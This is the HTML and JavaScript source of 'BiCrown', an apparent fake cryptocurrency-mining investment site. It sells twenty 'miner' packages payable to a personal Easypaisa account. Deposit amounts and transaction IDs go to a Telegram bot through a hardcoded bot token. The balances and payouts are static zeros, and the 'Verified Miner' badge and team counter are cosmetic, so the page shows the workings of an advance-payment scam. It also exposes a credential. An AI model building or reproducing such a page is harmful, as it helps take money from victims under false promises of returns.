<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BiCrown | Official Network</title>
    <style>
        :root { --neon: #bc13fe; --gold: #ffd700; --dark: #0a0a0a; --card: #161616; }
        body { font-family: 'Inter', sans-serif; background: var(--dark); color: white; margin: 0; display: flex; }
        
        /* Profile & Sidebar */
        .sidebar { width: 260px; background: #000; height: 100vh; border-right: 1px solid #222; position: fixed; padding: 25px; display: flex; flex-direction: column; }
        .user-profile { text-align: center; padding-bottom: 30px; border-bottom: 1px solid #222; margin-bottom: 20px; }
        .bicrown-avatar { width: 80px; height: 80px; background: linear-gradient(45deg, var(--gold), #ff8c00); border-radius: 50%; margin: 0 auto 10px; display: flex; align-items: center; justify-content: center; font-size: 40px; border: 3px solid var(--neon); box-shadow: 0 0 15px rgba(188, 19, 254, 0.3); }
        .verified-badge { font-size: 10px; background: rgba(0,255,136,0.1); color: #00ff88; padding: 3px 10px; border-radius: 10px; border: 1px solid #00ff88; }

        .nav-item { padding: 14px; color: #888; cursor: pointer; border-radius: 12px; margin-bottom: 8px; transition: 0.3s; display: flex; align-items: center; gap: 10px; text-decoration: none; }
        .nav-item:hover, .nav-item.active { background: #1a1a1a; color: white; border-left: 4px solid var(--gold); }

        /* Content */
        .main { margin-left: 290px; padding: 30px; width: 100%; }
        .card { background: var(--card); padding: 25px; border-radius: 20px; border: 1px solid #222; margin-bottom: 25px; }
        
        .btn { padding: 12px 20px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; }
        .btn-gold { background: linear-gradient(45deg, var(--gold), #b8860b); color: black; }
        .btn-gold:hover { transform: scale(1.02); box-shadow: 0 0 15px rgba(255, 215, 0, 0.4); }

        @media (max-width: 768px) { .sidebar { display: none; } .main { margin-left: 0; } }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="user-profile">
            <div class="bicrown-avatar">👑</div>
            <h3 style="margin: 10px 0 5px;">BiCrown User</h3>
            <span class="verified-badge">✓ Verified Miner</span>
        </div>
        
        <div class="nav-item active" onclick="showPage('dash')">🏠 Dashboard</div>
        <div class="nav-item" onclick="showPage('plans')">💎 Mining Plans</div>
        <div class="nav-item" onclick="showPage('wallet')">💰 Wallet & Deposit</div>
        <div class="nav-item" onclick="alert('Admin Chat: @YourTelegram')">🎧 Support</div>
        
        <div style="margin-top: auto;">
            <div class="nav-item" style="color: #ff4444;" onclick="location.reload()">🚪 Logout</div>
        </div>
    </div>

    <div class="main">
        <div id="dash-page">
            <div class="card" style="background: linear-gradient(to right, #161616, #000); border-color: var(--gold);">
                <div style="display: flex; justify-content: space-between;">
                    <div>
                        <p style="color: #888; margin: 0;">BiCrown Official Balance</p>
                        <h1 style="font-size: 45px; margin: 10px 0; color: var(--gold);">Rs <span id="user-bal">0.00</span></h1>
                    </div>
                    <img src="https://img.icons8.com/neon/96/crown.png" width="60" style="opacity: 0.5;">
                </div>
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                <div class="card">
                    <p style="color: #888;">Daily Payout</p>
                    <h2 style="color: #00ff88;">Rs 0.00</h2>
                </div>
                <div class="card">
                    <p style="color: #888;">Network Team</p>
                    <h2>0 Members</h2>
                </div>
            </div>
        </div>

        <div id="wallet-page" style="display:none;">
            <div class="card">
                <h2 style="color: var(--gold);">Deposit via Easypaisa</h2>
                <div style="background: #000; padding: 20px; border-radius: 15px; border: 1px dashed var(--gold); margin-bottom: 20px;">
                    <p><strong>Account:</strong> 0343-1793371</p> <p><strong>Name:</strong> Bi Crown</p>
                </div>
                <input type="number" id="amt" placeholder="Enter Amount" style="width:100%; padding:12px; margin-bottom:10px; background:#000; border:1px solid #333; color:white;">
                <input type="text" id="trx" placeholder="Transaction ID (TRX)" style="width:100%; padding:12px; margin-bottom:20px; background:#000; border:1px solid #333; color:white;">
                <button class="btn btn-gold" onclick="sendToAdmin()">Submit for Verification</button>
            </div>
        </div>
        
        <div id="plans-page" style="display:none;">
            <h2 style="margin-bottom: 20px;">BiCrown Mining Packages</h2>
            <div id="plan-list" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;"></div>
        </div>
    </div>

    <script>
        function showPage(id) {
            ['dash-page', 'wallet-page', 'plans-page'].forEach(p => document.getElementById(p).style.display = 'none');
            document.getElementById(id + '-page').style.display = 'block';
        }

        // Generate Plans
        const list = document.getElementById('plan-list');
        for(let i=1; i<=20; i++) {
            let price = 500 * i;
            list.innerHTML += `
                <div class="card" style="text-align:center; border-color: #333;">
                    <p style="color:var(--gold); font-size:12px;">LEVEL ${i}</p>
                    <h3>Rs ${price}</h3>
                    <button class="btn btn-gold" style="font-size:12px;" onclick="showPage('wallet')">Activate Miner</button>
                </div>
            `;
        }

        function sendToAdmin() {
            const botToken = "8494802061:AAHOhQJElPVkOqCuyZ0cP5PKL3k0_P50dDE";
            const chatId = "7005219148";
            const a = document.getElementById('amt').value;
            const t = document.getElementById('trx').value;
            
            if(a && t) {
                const msg = `👑 *BiCrown Deposit Request*%0A💰 Amount: Rs ${a}%0A🆔 TRX: ${t}`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}&parse_mode=Markdown`)
                .then(() => alert("Request Submitted! BiCrown team will verify it."));
            } else { alert("Details fill karein!"); }
        }
    </script>
</body>
</html>
